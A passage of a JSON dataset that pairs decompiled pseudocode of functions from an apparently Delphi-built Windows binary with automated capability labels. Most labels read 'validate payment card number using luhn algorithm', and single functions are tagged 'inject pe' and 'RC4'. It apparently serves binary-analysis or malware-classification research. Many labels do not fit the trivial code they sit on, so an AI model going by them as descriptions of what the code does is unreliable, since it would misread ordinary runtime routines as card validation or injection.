        "decompiled_code": "\nvoid fcn.00414958(void)\n\n{\n    uint *in_FS_OFFSET;\n    uint uStack44;\n    uint uStack40;\n    uchar *puStack36;\n    uint *puStack32;\n    uint pvarg;\n    \n    puStack32 = &fcn.00414958::pvarg;\n    puStack36 = 0x41496d;\n    sub.oleaut32.dll_VariantInit();\n    uStack40 = 0x4149ae;\n    uStack44 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffd4;\n    puStack36 = &stack0xfffffffc;\n    fcn.00411a68();\n    (**0x499984)();\n    fcn.00414a44();\n    *in_FS_OFFSET = uStack44;\n    puStack36 = 0x4149b5;\n    uStack40 = 0x4149ad;\n    fcn.0041163c();\n    return;\n}\n",
        "token_count": 207
    },
    "00414f80": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.00414f80(uint param_1, uint param_2)\n\n{\n    uint *in_FS_OFFSET;\n    uint uVar1;\n    uint uVar2;\n    uint uVar3;\n    uint uStack60;\n    uint uStack56;\n    uchar *puStack52;\n    uint *puStack48;\n    uint uStack44;\n    uint uStack40;\n    uchar *puStack36;\n    uint var_14h;\n    uint pvarg;\n    uint var_8h;\n    \n    puStack36 = &stack0xfffffffc;\n    uStack40 = 0x41502a;\n    uStack44 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffd4;\n    puStack48 = &fcn.00414f80::pvarg;\n    puStack52 = 0x414fa8;\n    sub.oleaut32.dll_VariantInit();\n    uStack56 = 0x41500d;\n    uStack60 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffc4;\n    uVar3 = 8;\n    uVar2 = 0;\n    uVar1 = 0x400;\n    puStack52 = &stack0xfffffffc;\n    (***0x494be0)(&fcn.00414f80::pvarg);\n    fcn.00411298();\n    fcn.00405e6c();\n    fcn.00405f58(param_2);\n    *in_FS_OFFSET = param_2;\n    fcn.0041163c(0x415014, uVar1, uVar2, uVar3);\n    return;\n}\n",
        "token_count": 359
    },
    "00415038": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.00415038(void)\n\n{\n    uint *in_FS_OFFSET;\n    uint uStack44;\n    uint uStack40;\n    uchar *puStack36;\n    uint *puStack32;\n    uint pvarg;\n    \n    puStack32 = &fcn.00415038::pvarg;\n    puStack36 = 0x41504d;\n    sub.oleaut32.dll_VariantInit();\n    uStack40 = 0x41508e;\n    uStack44 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffd4;\n    puStack36 = &stack0xfffffffc;\n    fcn.00411a68();\n    (**0x499984)();\n    fcn.00415164();\n    *in_FS_OFFSET = uStack44;\n    puStack36 = 0x415095;\n    uStack40 = 0x41508d;\n    fcn.0041163c();\n    return;\n}\n",
        "token_count": 204
    },
    "004156b8": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nvoid fcn.004156b8(void)\n\n{\n    uint *in_FS_OFFSET;\n    uint uStack44;\n    uint uStack40;\n    uchar *puStack36;\n    uint *puStack32;\n    uint pvarg;\n    uint var_8h;\n    \n    puStack32 = &fcn.004156b8::pvarg;\n    puStack36 = 0x4156cd;\n    sub.oleaut32.dll_VariantInit();\n    uStack40 = 0x415722;\n    uStack44 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffd4;\n    puStack36 = &stack0xfffffffc;\n    fcn.00411a68();\n    (**0x499984)();\n    if (pvarg != 0xd) {\n        fcn.00410e58();\n    }\n    fcn.00407024();\n    *in_FS_OFFSET = uStack44;\n    puStack36 = 0x415729;\n    uStack40 = 0x415721;\n    fcn.0041163c();\n    return;\n}\n",
        "token_count": 243
    },
    "00415d1c": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "inject pe/d5f0df8b10fc4abbbb9974951b6b6eb4"
        ],
        "decompiled_code": "\nvoid fcn.00415d1c(void)\n\n{\n    char cVar1;\n    uint16_t in_AX;\n    int32_t *in_FS_OFFSET;\n    uint *puStack552;\n    int32_t iStack548;\n    uint uStack544;\n    uchar *puStack540;\n    uint var_208h;\n    uint var_204h;\n    uint var_104h;\n    uint var_4h;\n    \n    puStack540 = &stack0xfffffffc;\n    uStack544 = 0x415e42;\n    iStack548 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xfffffddc;\n    if ((in_AX & 0xfff) < 0x15) {\n        puStack552 = 0x415d60;\n        puStack540 = &stack0xfffffffc;\n        fcn.00405584();\n    }\n    else if (in_AX == 0x100) {\n        puStack552 = 0x415d78;\n        puStack540 = &stack0xfffffffc;\n        fcn.00405584();\n    }\n    else if (in_AX == 0x101) {\n        puStack552 = 0x415d90;\n        puStack540 = &stack0xfffffffc;\n        fcn.00405584();\n    }\n    else {\n        cVar1 = fcn.00416178();\n        if (cVar1 == '\\0') {\n            fcn.00409e84();\n            puStack552 = 0x415e03;\n            fcn.00405864();\n        }\n        else {\n            puStack552 = &fcn.00415d1c::var_104h;\n            fcn.00404530();\n            fcn.00403098();\n            fcn.00405794();\n        }\n    }\n    if ((in_AX & 0x2000) != 0) {\n        fcn.00405864();\n    }\n    if ((in_AX & 0x4000) != 0) {\n        fcn.00405864();\n    }\n    *in_FS_OFFSET = puStack552;\n    uStack544 = 0x415e49;\n    iStack548 = 0x415e41;\n    fcn.00405530();\n    return;\n}\n",
        "token_count": 488
    },
    "00415f84": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00415f84(uint arg_8h)\n\n{\n    char cVar1;\n    int32_t in_EAX;\n    int32_t *var_8h;\n    uint var_4h;\n    \n    if ((arg_8h != *(in_EAX + 4)) && (cVar1 = fcn.00416178(),  cVar1 != '\\0')) {\n        (**(*var_8h + 0x1c))(arg_8h);\n        return;\n    }\n    fcn.004160f8();\n    return;\n}\n",
        "token_count": 125
    },
    "00415fd8": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "encrypt data using RC4 KSA/41e5dbd1fcbf406ebac8c999dfc1b5ff"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_1h\n\nuchar __cdecl fcn.00415fd8(int32_t arg_8h)\n\n{\n    int32_t *in_EAX;\n    uint32_t in_ECX;\n    uint var_1h;\n    \n    (**(*in_EAX + 0x38))(&var_1h);\n    return *(arg_8h * 3 + 0x491aae + (in_ECX >> 0x18));\n}\n",
        "token_count": 108
    },
    "0041604c": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nvoid fcn.0041604c(void)\n\n{\n    uint uVar1;\n    uchar extraout_DL;\n    uint *in_FS_OFFSET;\n    uint uStack28;\n    uint uStack24;\n    uint uStack20;\n    uint uStack16;\n    int32_t var_5h;\n    \n    uStack16 = 0x416057;\n    *NULL = fcn.00404a1c();\n    uStack16 = 0x499994;\n    uStack20 = 0x416067;\n    var_5h._0_1_ = extraout_DL;\n    sub.kernel32.dll_EnterCriticalSection();\n    uVar1 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffe4;\n    if (*(stack0xfffffff8 + 4) != 0) {\n        *(*0x499990 + -0x400 + *(stack0xfffffff8 + 4) * 4) = *0x491a6c;\n    }\n    *in_FS_OFFSET = uVar1;\n    uStack20 = 0x4160b6;\n    uStack24 = 0x499994;\n    uStack28 = 0x4160ae;\n    sub.kernel32.dll_LeaveCriticalSection();\n    return;\n}\n",
        "token_count": 280
    },
    "00416234": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "contain loop"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.00416234(uint param_1, int32_t *param_2)\n\n{\n    int32_t iVar1;\n    char cVar2;\n    int32_t iVar3;\n    int32_t iVar4;\n    uint *in_FS_OFFSET;\n    uint uStack316;\n    uint uStack312;\n    uchar *puStack308;\n    uint uStack304;\n    uint uStack300;\n    uint uStack296;\n    uchar *puStack292;\n    uint var_110h;\n    uint var_10h;\n    uint var_8h;\n    uint var_4h;\n    \n    puStack292 = &stack0xfffffffc;\n    uStack296 = 0x41630a;\n    uStack300 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xfffffed4;\n    uStack304 = 0x499994;\n    puStack308 = 0x416267;\n    sub.kernel32.dll_EnterCriticalSection();\n    uStack312 = 0x4162ed;\n    uStack316 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xfffffec4;\n    puStack308 = &stack0xfffffffc;\n    iVar3 = fcn.00406774();\n    if (-1 < iVar3) {\n        iVar3 = iVar3 + 1;\n        iVar4 = 0;\n        do {\n            iVar1 = *(*0x499990 + iVar4 * 4);\n            if ((iVar1 != 0) && (iVar1 != *0x491a6c)) {\n                fcn.00404530();\n                fcn.00405794();\n                cVar2 = fcn.00409a84();\n                if (cVar2 != '\\0') {\n                    *param_2 = iVar1;\n                    break;\n                }\n            }\n            iVar4 = iVar4 + 1;\n            iVar3 = iVar3 + -1;\n        } while (iVar3 != 0);\n    }\n    *in_FS_OFFSET = uStack316;\n    puStack308 = 0x4162f4;\n    uStack312 = 0x499994;\n    uStack316 = 0x4162ec;\n    sub.kernel32.dll_LeaveCriticalSection();\n    return;\n}\n",
        "token_count": 479
    },
    "00416784": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.00416784(uint8_t *param_1, int32_t **param_2)\n\n{\n    uint8_t *puVar1;\n    uint8_t uVar2;\n    int32_t *piVar3;\n    uint8_t uVar4;\n    int32_t *in_EAX;\n    uint32_t uVar5;\n    uint8_t *puVar6;\n    \n    piVar3 = param_2[2];\n    if (*(param_2 + 0xb) == 0xff) {\n        puVar6 = (piVar3 & 0xffffff) + in_EAX;\n        uVar2 = *(**param_2 + 2 + *(**param_2 + 1));\n        uVar4 = *param_1;\n        if (uVar2 <= *param_1) {\n            uVar4 = uVar2;\n        }\n        *puVar6 = uVar4;\n        puVar1 = param_1 + 1;\n        for (uVar5 = uVar4; puVar6 = puVar6 + 1,  uVar5 != 0; uVar5 = uVar5 - 1) {\n            *puVar6 = *puVar1;\n            puVar1 = puVar1 + 1;\n        }\n        return;\n    }\n    if (0xfd < *(param_2 + 0xb)) {\n        (**(piVar3 + *in_EAX))();\n        return;\n    }\n    (*piVar3)();\n    return;\n}\n",
        "token_count": 330
    },
    "004167d8": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.004167d8(void)\n\n{\n    fcn.004057e8();\n    fcn.00416784();\n    return;\n}\n",
        "token_count": 33
    },
    "00416820": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.00416820(uint param_1, int32_t param_2)\n\n{\n    int32_t *in_EAX;\n    \n    if (*(param_2 + 0xb) == 0xff) {\n        fcn.0041680c();\n        return;\n    }\n    if (0xfd < *(param_2 + 0xb)) {\n        (**(*(param_2 + 8) + *in_EAX))();\n        return;\n    }\n    (**(param_2 + 8))();\n    return;\n}\n",
        "token_count": 117
    },
    "004168e8": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.004168e8(uint param_1, uint *param_2)\n\n{\n    char cVar1;\n    int32_t *in_EAX;\n    uint *in_FS_OFFSET;\n    uint uStack40;\n    uint uStack36;\n    uchar *puStack32;\n    uint var_ch;\n    code *var_8h;\n    uint var_4h;\n    \n    puStack32 = &stack0xfffffffc;\n    uStack36 = 0x4169af;\n    uStack40 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffd8;\n    cVar1 = ***param_2;\n    if ((cVar1 == '\\x05') || (cVar1 == '\\n')) {\n        fcn.004057d4();\n        fcn.004168b8();\n    }\n    else if (cVar1 == '\\v') {\n        var_8h = param_2[2];\n        if ((var_8h & 0xff000000) == 0xff000000) {\n            puStack32 = &stack0xfffffffc;\n            fcn.00405d64();\n        }\n        else {\n            if ((var_8h & 0xff000000) == 0xfe000000) {\n                var_8h = *(*in_EAX + var_8h);\n            }\n            if (param_2[4] == -0x80000000) {\n                puStack32 = &stack0xfffffffc;\n                (*var_8h)();\n            }\n            else {\n                puStack32 = &stack0xfffffffc;\n                (*var_8h)();\n            }\n        }\n    }\n    *in_FS_OFFSET = uStack40;\n    puStack32 = 0x4169b6;\n    uStack36 = 0x4169ae;\n    fcn.00405530();\n    return;\n}\n",
        "token_count": 405
    },
    "00416bcc": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.00416bcc(uint param_1, int32_t param_2)\n\n{\n    int32_t *in_EAX;\n    \n    if (*(param_2 + 0xb) == 0xff) {\n        fcn.00416bb8();\n        return;\n    }\n    if (0xfd < *(param_2 + 0xb)) {\n        (**(*(param_2 + 8) + *in_EAX))();\n        return;\n    }\n    (**(param_2 + 8))();\n    return;\n}\n",
        "token_count": 117
    },
    "00416c0c": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.00416c0c(uint *param_1, int32_t param_2)\n\n{\n    code *pcVar1;\n    uint uVar2;\n    int32_t *in_EAX;\n    uint *puVar3;\n    \n    pcVar1 = *(param_2 + 8);\n    if (*(param_2 + 0xb) == 0xff) {\n        puVar3 = in_EAX + (pcVar1 & 0xffffff);\n        uVar2 = param_1[1];\n        *puVar3 = *param_1;\n        puVar3[1] = uVar2;\n        return;\n    }\n    if (0xfd < *(param_2 + 0xb)) {\n        (**(pcVar1 + *in_EAX))();\n        return;\n    }\n    (*pcVar1)(*param_1, param_1[1]);\n    return;\n}\n",
        "token_count": 197
    },
    "00416c44": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00416c44(uint arg_8h, uint arg_ch)\n\n{\n    code *pcVar1;\n    int32_t *in_EAX;\n    uint *puVar2;\n    int32_t in_EDX;\n    \n    pcVar1 = *(in_EDX + 8);\n    if (*(in_EDX + 0xb) == 0xff) {\n        puVar2 = in_EAX + (pcVar1 & 0xffffff);\n        *puVar2 = arg_8h;\n        puVar2[1] = arg_ch;\n    }\n    else if (*(in_EDX + 0xb) < 0xfe) {\n        (*pcVar1)(arg_8h, arg_ch);\n    }\n    else {\n        (**(pcVar1 + *in_EAX))();\n    }\n    return;\n}\n",
        "token_count": 182
    },
    "00416c80": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.00416c80(uint param_1, int32_t param_2)\n\n{\n    int32_t *in_EAX;\n    code *pcStack16;\n    \n    pcStack16 = *(param_2 + 8);\n    if ((pcStack16 & 0xff000000) == 0xff000000) {\n        fcn.00407024();\n    }\n    else {\n        if ((pcStack16 & 0xff000000) == 0xfe000000) {\n            pcStack16 = *(*in_EAX + pcStack16);\n        }\n        if (*(param_2 + 0x10) == -0x80000000) {\n            (*pcStack16)();\n        }\n        else {\n            (*pcStack16)();\n        }\n    }\n    return;\n}\n",
        "token_count": 171
    },
    "00418568": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nulong __fastcall fcn.00418568(uint param_1, uint param_2)\n\n{\n    char cVar1;\n    int32_t in_EAX;\n    int32_t iVar2;\n    int32_t iVar3;\n    int32_t iVar4;\n    \n    iVar3 = 0;\n    iVar4 = *(*(in_EAX + 0xc) + 8);\n    if (-1 < iVar4 + -1) {\n        do {\n            iVar2 = fcn.00419898();\n            cVar1 = fcn.0040487c();\n            if ((cVar1 != '\\0') && ((iVar3 == 0 || (cVar1 = fcn.0040487c(),  cVar1 != '\\0')))) {\n                iVar3 = iVar2;\n            }\n            iVar4 = iVar4 + -1;\n        } while (iVar4 != 0);\n    }\n    return CONCAT44(param_2, iVar3);\n}\n",
        "token_count": 205
    },
    "0041897c": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nint32_t __fastcall fcn.0041897c(uint param_1, char param_2)\n\n{\n    int32_t in_EAX;\n    uint uVar1;\n    int32_t iVar2;\n    char extraout_DL;\n    int32_t *in_FS_OFFSET;\n    \n    if (param_2 != '\\0') {\n        in_EAX = fcn.00404974();\n        param_2 = extraout_DL;\n    }\n    fcn.00404620();\n    uVar1 = fcn.00404620();\n    *(in_EAX + 4) = uVar1;\n    sub.kernel32.dll_InitializeCriticalSection();\n    iVar2 = fcn.00418638();\n    fcn.00419740();\n    *(iVar2 + 0x10) = 1;\n    if (param_2 != '\\0') {\n        fcn.004049cc();\n        *in_FS_OFFSET = in_EAX + 8;\n    }\n    return in_EAX;\n}\n",
        "token_count": 212
    },
    "00418ad8": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nvoid __cdecl fcn.00418ad8(uint arg_8h)\n\n{\n    uint *in_FS_OFFSET;\n    uint arg_8h_00;\n    uint *arg_ch;\n    uint uStack284;\n    uint uStack280;\n    uchar *puStack276;\n    uint var_10ch;\n    uint var_108h;\n    uint *var_8h;\n    uint var_4h;\n    \n    puStack276 = &stack0xfffffffc;\n    var_10ch = 0;\n    uStack280 = 0x418b5b;\n    uStack284 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &uStack284;\n    fcn.00404530();\n    var_8h = &var_108h;\n    var_4h._0_1_ = 4;\n    arg_ch = &var_8h;\n    arg_8h_00 = 0;\n    fcn.00407550();\n    fcn.0040db38(arg_8h_00, arg_ch);\n    fcn.00404ec4();\n    *in_FS_OFFSET = arg_8h_00;\n    uStack284 = 0x418b62;\n    fcn.00405530();\n    return;\n}\n",
        "token_count": 280
    },
    "00418c34": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.00418c34(void)\n\n{\n    int32_t in_EAX;\n    \n    sub.kernel32.dll_EnterCriticalSection(in_EAX + 8);\n    return;\n}\n",
        "token_count": 39
    },
    "00418cec": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.00418cec(void)\n\n{\n    int32_t in_EAX;\n    \n    sub.kernel32.dll_LeaveCriticalSection(in_EAX + 8);\n    return;\n}\n",
        "token_count": 39
    },
    "00418f38": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nvoid fcn.00418f38(void)\n\n{\n    uint *in_FS_OFFSET;\n    uint arg_8h;\n    uint *arg_ch;\n    uint uStack32;\n    uint uStack28;\n    uchar *puStack24;\n    uint var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    puStack24 = &stack0xfffffffc;\n    uStack28 = 0x418f98;\n    uStack32 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &uStack32;\n    var_4h._0_1_ = 0xb;\n    arg_ch = &var_8h;\n    arg_8h = 0;\n    fcn.00407550();\n    fcn.0040db38(arg_8h, arg_ch);\n    fcn.00404ec4();\n    *in_FS_OFFSET = arg_8h;\n    uStack32 = 0x418f9f;\n    fcn.00405530();\n    return;\n}\n",
        "token_count": 228
    },
    "00419228": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00419228(uint arg_8h, uint arg_ch)\n\n{\n    int32_t in_EAX;\n    uint in_ECX;\n    uint extraout_ECX;\n    char in_DL;\n    char extraout_DL;\n    uint *in_FS_OFFSET;\n    uint uStack20;\n    \n    if (in_DL != '\\0') {\n        in_EAX = fcn.00404974();\n        in_ECX = extraout_ECX;\n        in_DL = extraout_DL;\n    }\n    *(in_EAX + 4) = in_ECX;\n    *(in_EAX + 8) = arg_ch;\n    *(in_EAX + 0xc) = arg_8h;\n    if (in_DL != '\\0') {\n        fcn.004049cc();\n        *in_FS_OFFSET = uStack20;\n    }\n    return;\n}\n",
        "token_count": 186
    },
    "00419308": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuint __cdecl fcn.00419308(int32_t arg_8h)\n\n{\n    char cVar1;\n    int32_t in_ECX;\n    uint *in_EDX;\n    int32_t iVar2;\n    uint var_4h;\n    \n    if (-1 < arg_8h) {\n        arg_8h = arg_8h + 1;\n        iVar2 = in_ECX + 4;\n        do {\n            cVar1 = fcn.00409a84();\n            if (cVar1 != '\\0') {\n                *in_EDX = *(iVar2 + -4);\n                return 1;\n            }\n            iVar2 = iVar2 + 8;\n            arg_8h = arg_8h + -1;\n        } while (arg_8h != 0);\n    }\n    return 0;\n}\n",
        "token_count": 182
    },
    "00419348": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "contain loop"
        ],
        "decompiled_code": "\nuchar __cdecl fcn.00419348(int32_t arg_8h)\n\n{\n    int32_t in_EAX;\n    int32_t *in_ECX;\n    uint var_4h;\n    \n    if (-1 < arg_8h) {\n        arg_8h = arg_8h + 1;\n        do {\n            if (in_EAX == *in_ECX) {\n                fcn.00405584();\n                return 1;\n            }\n            in_ECX = in_ECX + 2;\n            arg_8h = arg_8h + -1;\n        } while (arg_8h != 0);\n    }\n    return 0;\n}\n",
        "token_count": 146
    },
    "004195b0": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "contain loop"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.004195b0(int32_t arg_8h)\n\n{\n    int32_t in_EAX;\n    uint *in_FS_OFFSET;\n    uint uStack284;\n    uint uStack280;\n    uchar *puStack276;\n    uint var_104h;\n    uint var_4h;\n    \n    puStack276 = &stack0xfffffffc;\n    uStack280 = 0x419646;\n    uStack284 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xfffffee4;\n    if ((in_EAX != *0x418148) && (in_EAX != *(arg_8h + -8))) {\n        fcn.004045dc();\n        fcn.004195b0(arg_8h);\n        fcn.00404530();\n        fcn.00405794();\n        fcn.004069c0(0);\n        fcn.00406a10();\n        fcn.00419448();\n    }\n    *in_FS_OFFSET = uStack284;\n    puStack276 = 0x41964d;\n    uStack280 = 0x419645;\n    fcn.00405530();\n    return;\n}\n",
        "token_count": 255
    },
    "0041978c": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.0041978c(uint param_1, int32_t param_2)\n\n{\n    int32_t iVar1;\n    int32_t *in_EAX;\n    \n    if ((param_2 < 0) || (in_EAX[2] <= param_2)) {\n        fcn.00419824();\n    }\n    iVar1 = *(in_EAX[1] + param_2 * 4);\n    in_EAX[2] = in_EAX[2] + -1;\n    if (param_2 < in_EAX[2]) {\n        fcn.004030fc();\n    }\n    if (iVar1 != 0) {\n        (**(*in_EAX + 4))();\n    }\n    return;\n}\n",
        "token_count": 163
    },
    "004197ec": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.004197ec(uint param_1, uint param_2)\n\n{\n    uint uStack52;\n    int32_t iStack48;\n    uint uStack44;\n    uchar auStack16 [4];\n    uchar uStack12;\n    \n    fcn.004197e8();\n    uStack12 = 0;\n    uStack52 = 0;\n    iStack48 = fcn.0040db38(0, auStack16);\n    if (iStack48 == 0) {\n        iStack48 = fcn.00405470();\n    }\n    uStack44 = param_2;\n    // WARNING: Could not recover jumptable at 0x00404ee5. Too many branches\n    // WARNING: Treating indirect jump as call\n    (**0x495014)(0xeedfade, 1, 7, &uStack52);\n    return;\n}\n",
        "token_count": 195
    },
    "00419914": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.00419914(int32_t param_1, int32_t param_2)\n\n{\n    int32_t *in_EAX;\n    \n    if ((param_2 < 0) || (in_EAX[2] < param_2)) {\n        fcn.00419824();\n    }\n    if (in_EAX[2] == in_EAX[3]) {\n        (***in_EAX)();\n    }\n    if (param_2 < in_EAX[2]) {\n        fcn.004030fc();\n    }\n    *(in_EAX[1] + param_2 * 4) = param_1;\n    in_EAX[2] = in_EAX[2] + 1;\n    if (param_1 != 0) {\n        (**(*in_EAX + 4))();\n    }\n    return;\n}\n",
        "token_count": 186
    },
    "004199fc": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.004199fc(uint param_1, int32_t param_2)\n\n{\n    int32_t in_EAX;\n    \n    if ((param_2 < *(in_EAX + 8)) || (0x7ffffff < param_2)) {\n        fcn.00419824();\n    }\n    if (param_2 != *(in_EAX + 0xc)) {\n        fcn.00402f34();\n        *(in_EAX + 0xc) = param_2;\n    }\n    return;\n}\n",
        "token_count": 116
    },
    "00419a38": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.00419a38(uint param_1, int32_t param_2)\n\n{\n    int32_t in_EAX;\n    int32_t iVar1;\n    int32_t iVar2;\n    \n    if ((param_2 < 0) || (0x7ffffff < param_2)) {\n        fcn.00419824();\n    }\n    if (*(in_EAX + 0xc) < param_2) {\n        fcn.004199fc();\n    }\n    if (*(in_EAX + 8) < param_2) {\n        fcn.00403af4();\n    }\n    else {\n        iVar1 = *(in_EAX + 8) + -1;\n        iVar2 = param_2 - iVar1;\n        if (iVar2 == 0 || param_2 < iVar1) {\n            iVar2 = iVar2 + -1;\n            do {\n                fcn.0041978c();\n                iVar2 = iVar2 + 1;\n            } while (iVar2 != 0);\n        }\n    }\n    *(in_EAX + 8) = param_2;\n    return;\n}\n",
        "token_count": 244
    },
    "00419ab0": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nint32_t __fastcall fcn.00419ab0(uint param_1, char param_2)\n\n{\n    int32_t in_EAX;\n    uint uVar1;\n    char extraout_DL;\n    int32_t *in_FS_OFFSET;\n    \n    if (param_2 != '\\0') {\n        in_EAX = fcn.00404974();\n        param_2 = extraout_DL;\n    }\n    fcn.00404620();\n    sub.kernel32.dll_InitializeCriticalSection();\n    uVar1 = fcn.00404620();\n    *(in_EAX + 4) = uVar1;\n    *(in_EAX + 0x20) = 0;\n    if (param_2 != '\\0') {\n        fcn.004049cc();\n        *in_FS_OFFSET = in_EAX + 8;\n    }\n    return in_EAX;\n}\n",
        "token_count": 187
    },
    "00419b04": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nvoid fcn.00419b04(void)\n\n{\n    uchar extraout_DL;\n    uint *in_FS_OFFSET;\n    uint uStack24;\n    int32_t iStack20;\n    uchar *puStack16;\n    int32_t var_5h;\n    \n    puStack16 = 0x419b0f;\n    *NULL = fcn.00404a1c();\n    puStack16 = 0x419b1d;\n    var_5h._0_1_ = extraout_DL;\n    fcn.00419c08();\n    iStack20 = 0x419b67;\n    uStack24 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffe8;\n    puStack16 = &stack0xfffffffc;\n    fcn.00404650();\n    fcn.00404640();\n    *in_FS_OFFSET = uStack24;\n    puStack16 = 0x419b6e;\n    iStack20 = 0x419b5a;\n    fcn.00419c6c();\n    iStack20 = stack0xfffffff8 + 8;\n    uStack24 = 0x419b66;\n    sub.kernel32.dll_DeleteCriticalSection();\n    return;\n}\n",
        "token_count": 275
    },
    "00419c6c": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.00419c6c(void)\n\n{\n    int32_t in_EAX;\n    \n    sub.kernel32.dll_LeaveCriticalSection(in_EAX + 8);\n    return;\n}\n",
        "token_count": 41
    },
    "00419e54": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
